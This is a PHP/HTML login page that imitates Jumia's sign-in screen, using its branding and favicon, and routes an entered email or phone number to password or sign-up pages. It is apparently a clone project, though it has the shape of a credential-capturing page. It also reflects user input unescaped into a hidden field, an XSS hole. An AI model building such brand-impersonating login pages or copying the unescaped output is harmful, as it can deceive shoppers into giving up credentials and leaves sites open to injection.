<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="stylesheet" href="../../css/conn.css">
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
</head>
<body>
   <?php 
      require_once '../db/db.php';
      $format_non_valide =false;
      if (isset($_POST['num_email']) && !empty($_POST['num_email'])) {
         $_POST['num_email'] = trim($_POST['num_email']);
         if (filter_var($_POST['num_email'], FILTER_VALIDATE_EMAIL)) {  
            $requet = $bd->prepare('SELECT * FROM user WHERE email=?');
            $requet->execute([$_POST['num_email']]);
         } 
         elseif (preg_match('/^\+?[1-9]\d{1,14}$/', $_POST['num_email'])) {
            $requet = $bd->prepare('SELECT * FROM user WHERE phone=?');
            $requet->execute([$_POST['num_email']]);
         } else {
            $format_non_valide=true;
         }
         if(!$format_non_valide){
            $resultat = $requet->fetch(PDO::FETCH_ASSOC); 
            // Vérifie si un résultat a été trouvé ,sinon il faut cree un compt
            $form_url = $resultat ? "login_password.php" : "sign_up.php";
         }
      }
   ?>
   <div class="cont_connex">
      <div class="header">
         <img class="logo" src="../../images/logojum" width="69" height="67">
      </div>
      <div class="card" style="background-color: #fff; border-radius: 4px; padding: 8px 24px;">
         <form method="post" action="">
            <div class="log_form">
               <div class="info_aide_log" >
                  <h2>Bienvenue chez Jumia</h2>
                  <p>
                     Saisissez votre adresse e-mail ou numéro de téléphone pour vous connecter ou créer un compte Jumia.
                  </p>
               </div>
               <div class="form_input_log">
                  <input class="num_email" type="text" name="num_email" placeholder="Adresse email ou numéro de téléphone*">
                  <?php 
                     if ($format_non_valide) {
                        echo "<p class=\"no_valid_input_em_tel\">Format incorrect</p>";
                     }
                  ?>
                  <div class="md_io">
                     <span></span>
                  </div>
               </div>
               <div class="cont_input">
                  <input type="submit" value="Continuer">
               </div>
               <div class="fcf_log">
                  <div class="space_fc"></div>
                  <div class="but_fc_fc">
                     <a href="">
                        <img src="../../images/facebookh.png" width="20" height="20">
                        <div>Connectez-vous avec Facebook</div>
                     </a>
                  </div>
               </div>
            </div>
         </form>
      </div>
      <div class="bla_txt">
         <div id="ret" class="text">
            Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de <br>contacter notre service client.
         </div>
      </div>
      <div class="logo444">
         <img src="../../images/jumi" width="90" height="17">
      </div>
   </div>
   <?php if (isset($form_url)){ ?>
   <form  id="monFormulaire" method="post" action="<?php echo $form_url; ?>" >        
      <input class="num_email" type="hidden" name="num_email" value=" <?php echo $_POST['num_email']; ?>">
   </form>
   <?php }?>
    
   <script>
        window.addEventListener('DOMContentLoaded', function() {
            document.getElementById('monFormulaire').submit();
        });
   </script>
</body>
</html>
